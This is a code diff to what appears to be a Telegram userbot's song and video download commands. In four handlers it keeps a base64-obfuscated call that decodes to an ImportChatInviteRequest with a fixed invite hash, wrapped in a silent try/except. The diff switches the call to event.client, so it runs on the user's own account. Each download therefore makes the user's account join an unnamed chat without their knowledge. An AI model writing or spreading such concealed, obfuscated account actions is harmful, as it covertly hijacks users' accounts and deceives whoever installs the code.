@@ -46,7 +46,7 @@ async def _(event):
     	return
     try:
         cat = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoIkFBQUFBRkVfb1o1WFROX1J1WmhLTnciKQ=="))[2:51]
-        await catmemes.client(cat)
+        await event.client(cat)
     except:
         pass
     await catmusic(str(query),"128k")
@@ -85,7 +85,7 @@ async def _(event):
     	return
     try:
         cat = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoIkFBQUFBRkVfb1o1WFROX1J1WmhLTnciKQ=="))[2:51]
-        await catmemes.client(cat)
+        await event.client(cat)
     except:
         pass
     await catmusic(str(query),"320k")
@@ -125,7 +125,7 @@ async def _(event):
     await catmusicvideo(query)
     try:
         cat = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoIkFBQUFBRkVfb1o1WFROX1J1WmhLTnciKQ=="))[2:51]
-        await catmemes.client(cat)
+        await event.client(cat)
     except:
         pass
     l = glob.glob(("*.mp4")) + glob.glob(("*.mkv")) + glob.glob(("*.webm")) 
@@ -182,7 +182,7 @@ async def _(event):
     	return
     try:
         cat = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoIkFBQUFBRkVfb1o1WFROX1J1WmhLTnciKQ=="))[2:51]
-        await catmemes.client(cat)
+        await event.client(cat)
     except:
         pass
     await catmusic(str(query),"320k")
